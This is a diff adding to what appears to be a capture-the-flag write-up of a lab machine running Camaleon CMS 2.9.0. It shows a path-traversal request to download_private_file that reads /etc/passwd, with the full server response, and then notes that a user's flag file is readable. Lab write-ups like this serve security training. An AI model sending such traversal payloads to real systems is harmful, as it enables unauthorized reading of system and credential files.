@@ -214,3 +214,82 @@ by Ben "epi" Risher 🤓                 ver: 2.13.1
 <img width="621" height="1035" alt="image" src="https://github.com/user-attachments/assets/e5e0ad63-9564-4621-81fc-3594775d5f25" />
 
 
+On the login page, we see that we can potentially create an account. Attempting to create a test account, we confirm that this operation works and we are able to make a user on this platform.
+
+<img width="661" height="1236" alt="image" src="https://github.com/user-attachments/assets/91aad06b-7aef-46e3-8905-e74909f40c10" />
+<img width="789" height="1005" alt="image" src="https://github.com/user-attachments/assets/cea4daf9-929c-4b47-bcf5-b6c9da431ec9" />
+
+Logging in we see that we are inside the admin panel as a guest user.
+<img width="2253" height="512" alt="image" src="https://github.com/user-attachments/assets/0d67bd0e-3518-466e-aa47-e7c242edb25a" />
+
+We don't have any admin features. However, we do see that this webpage is being ran by Camaleon v 2.9.0
+<img width="664" height="59" alt="image" src="https://github.com/user-attachments/assets/3e65059a-caf2-417c-b2f8-3695bc2c2d66" />
+
+There are a multitude of critical and high CVEs associated with this version of Camaleon. For this writeup, I used [GHSL-2024-183](https://github.com/advisories/GHSA-cp65-5m9r-vc2c), which uses MediaController's download_private_file method for any authenticated user to download any file they want on the machine.
+
+So using the HTTP payload below, we see that we are able to access any file on the computer.
+```
+GET /admin/media/download_private_file?file=../../../../../etc/passwd
+```
+
+**HTTP RESPONSE**
+```
+HTTP/1.1 200 OK
+Server: nginx/1.26.3 (Ubuntu)
+Date: Mon, 02 Feb 2026 22:40:16 GMT
+Content-Type: application/octet-stream
+Content-Length: 1809
+Connection: keep-alive
+x-frame-options: SAMEORIGIN
+x-xss-protection: 0
+x-content-type-options: nosniff
+x-permitted-cross-domain-policies: none
+referrer-policy: strict-origin-when-cross-origin
+content-disposition: inline; filename="passwd"; filename*=UTF-8''passwd
+content-transfer-encoding: binary
+cache-control: no-cache
+x-request-id: cfa42ea4-3cb0-4018-9e36-ee3606981abc
+x-runtime: 0.032233
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
+pollinate:x:103:1::/var/cache/pollinate:/bin/false
+polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
+syslog:x:104:104::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
+tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
+william:x:1001:1001::/home/william:/bin/bash
+_laurel:x:101:988::/var/log/laurel:/bin/false
+```
+Within the contents of the `etc/passwd` file, we see two users that can log in: `trivia`, and `william`. 
+
+Looking for any low hanging fruits, I check to see if I can access one of these user's home directory. Looking to see if we can access the user.txt file, we see that we can read `william's` user flag. Telling us that this web server is either being ran by the `william` user, or this user has misconfigured permissions.
+<img width="1598" height="703" alt="image" src="https://github.com/user-attachments/assets/166e661b-1655-4e7f-9890-c28439786dc6" />
+
+
